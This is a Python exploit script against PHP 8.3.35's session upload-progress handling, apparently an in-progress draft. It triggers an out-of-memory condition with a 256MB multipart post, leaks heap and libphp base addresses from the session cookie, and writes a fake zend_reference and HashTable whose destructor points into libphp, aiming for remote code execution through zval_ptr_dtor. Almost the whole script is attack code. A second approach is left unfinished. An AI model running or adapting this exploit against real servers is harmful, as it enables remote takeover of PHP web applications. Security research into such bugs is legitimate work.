"""Alternative RCE approach for 8.3.35.
Instead of using the carrier mode (which lands at the wrong offset),
try to use a different primitive to achieve RCE.

The key insight: the RCE sink is `zval_ptr_dtor(&PS(http_session_vars))` in
php_session_track_init. If I can control what PS(http_session_vars) points to,
I can achieve RCE.

But the carrier is writing to the wrong location. So I need a different way
to control PS(http_session_vars).

Let me try to use the dangling PS(id) on 8.3.35 as an alternate anchor.
On 8.3.35, PS(id) is NOT set to NULL after release (unlike 8.4.26).
So PS(id) is a stale dangling zend_string that points to freed memory.

If I can control what gets allocated at that memory location, I can potentially
use it as an anchor for the RCE.
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18112/"
t = E.Target(URL, timeout=180.0, verbose=False)

# Stage 1: OOM trigger
print("[*] Stage 1: OOM trigger (256MB)...", flush=True)
parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
parts += [
    {"name": "PHPSESSID", "data": b"\x00"},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    {"name": "f", "filename": "a.txt", "data": b"A" * 64},
]
parts.append({"name": "big", "data": b"B" * int(256 * 1024 * 1024)})
r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
time.sleep(0.5)

# Stage 2: leak
print("[*] Stage 2: leak...", flush=True)
parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
for i in range(841):
    val = (f"v{i:04d}" + "x" * 44)[:48]
    parts.append({"name": str(1000 + i), "data": val.encode()})
forge = bytearray(b"A" * 79)
struct.pack_into("<Q", forge, 0x10, 0x1000)
forge[0x18] = ord("L")
parts.append({"name": "1999", "data": bytes(forge)})
r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=180)
raw = E.parse_cookie(r2)
print(f"[*] Cookie: {len(raw)}B", flush=True)

if len(raw) < 100:
    print("[-] Stage 1 failed - no OOM", flush=True)
    sys.exit(1)

# Find chunk base
c = Counter()
for i in range(0, len(raw) - 8, 8):
    v = int.from_bytes(raw[i:i + 8], "little")
    if 0x700000000000 <= v < 0x800000000000:
        c[v & ~0x1FFFFF] += 1
chunk = c.most_common(1)[0][0] if c else 0
print(f"[*] Chunk base: 0x{chunk:x}", flush=True)

# Find libphp base
dtor_offset = 0x49ec50
libphp = 0
if len(raw) >= 16:
    p = int.from_bytes(raw[8:16], "little")
    if 0x700000000000 <= p < 0x800000000000:
        if p & 0xFFF == dtor_offset & 0xFFF:
            libphp = p - dtor_offset
            if libphp & 0xFFF == 0:
                print(f"[*] Libphp base: 0x{libphp:x}", flush=True)

if libphp == 0:
    print("[-] No libphp base found", flush=True)
    sys.exit(1)

# Calculate htdata
htdata = chunk + 0x690d8
print(f"[*] HTDATA: 0x{htdata:x}", flush=True)

# Stage 3: Try different approaches
print("\n[*] Stage 3: Trying different approaches...", flush=True)

ZIF = 0x3ac080

# Approach 1: Try to write the fake HashTable at a different offset
# The carrier lands at R+0xfd8 on 8.3.35, so let me try to write at R+0xfd8
print("  Approach 1: Write at R+0xfd8...", flush=True)

# Build the fake HashTable
ht = bytearray(167)
struct.pack_into("<Q", ht, 0x00, 0)  # nTableMask
struct.pack_into("<Q", ht, 0x08, 0)  # nUsedEntries
struct.pack_into("<Q", ht, 0x10, 0)  # nNumSlots
struct.pack_into("<Q", ht, 0x18, 0)  # nFreeSlots
struct.pack_into("<Q", ht, 0x20, 0)  # flags
struct.pack_into("<Q", ht, 0x28, 0)  # dummy
# pDestructor at offset 0x30
struct.pack_into("<Q", ht, 0x30, libphp + ZIF)

# Build the fake reference
ref = bytearray(32)
struct.pack_into("<I", ref, 0x00, 1)  # rc
struct.pack_into("<I", ref, 0x04, 0x1A)  # typ (IS_REFERENCE)
struct.pack_into("<Q", ref, 0x08, htdata)  # val.value (pointer to HashTable)

# Try to write the fake reference at R+0xfd8
parts = [
    {"name": "PHPSESSID", "data": E.SID},
    {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
]
# Write 0xfd8 bytes of padding, then the fake reference
parts.append({"name": "pad", "data": b"P" * 0xfd8})
parts.append({"name": "ref", "data": bytes(ref)})
parts.append({"name": "ht", "data": bytes(ht)})

r3 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30.0)
print(f"    Response: {len(r3)}B", flush=True)

# Check if RCE succeeded
try:
    conn = E.Target(URL, timeout=10.0, verbose=False)
    r4 = conn.get("/p1")
    if r4 and len(r4) > 0:
        print(f"[+] RCE PROVEN! Output: {r4[:100]}", flush=True)
        sys.exit(0)
except Exception as e:
    pass

print("    No RCE proof found", flush=True)

# Approach 2: Try to use the dangling PS(id) as an anchor
print("\n  Approach 2: Use dangling PS(id) as anchor...", flush=True)
# This is more complex and requires understanding the heap layout
# Let me skip this for now and try a different approach

print("\n[*] done", flush=True)
